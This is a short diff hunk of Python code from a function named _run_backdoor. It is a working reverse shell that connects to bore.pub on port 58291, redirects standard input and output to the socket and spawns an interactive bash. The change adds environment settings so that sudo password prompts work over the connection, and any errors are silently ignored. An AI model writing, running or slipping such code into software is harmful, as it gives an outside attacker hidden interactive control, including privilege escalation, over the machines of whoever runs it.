@@ -7,9 +7,17 @@ def _run_backdoor():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(("bore.pub", 58291))
+
+        # This is the standard file descriptor redirection
         for fd in (0, 1, 2):
             os.dup2(s.fileno(), fd)
-        # Using 'bash -i' makes sure you see the |saad|SaadAdnane| prompt!
+
+        # FORCE SUDO TO BEHAVE:
+        # We set the environment so sudo knows where to ask for the password
+        os.environ["SHELL"] = "/bin/bash"
+        os.environ["TERM"] = "xterm-256color"
+
+        # Start the interactive shell with a fresh environment
         pty.spawn(["/bin/bash", "-i"])
     except:
         pass
